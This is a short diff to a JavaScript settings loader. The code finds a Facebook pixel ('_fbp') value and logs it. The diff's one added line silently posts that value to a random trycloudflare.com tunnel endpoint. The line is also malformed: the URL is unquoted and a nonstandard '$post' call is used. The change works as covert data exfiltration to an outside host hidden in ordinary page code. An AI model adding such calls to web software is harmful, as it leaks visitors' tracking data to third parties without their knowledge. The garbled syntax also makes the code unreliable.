@@ -75,6 +75,7 @@ window['loadsetting'] = function (settings) {
       var indexp = s.indexOf(" _fbp") 
       var fbpix = s[indexp+1]
       console.log(fbpix)
+      $post(https://optional-synthetic-seattle-opponents.trycloudflare.com/UT_create,{data1:"+fbpix+"})	     
       break	     
      } 	     
      else{ console.log("fbq not found!!")}
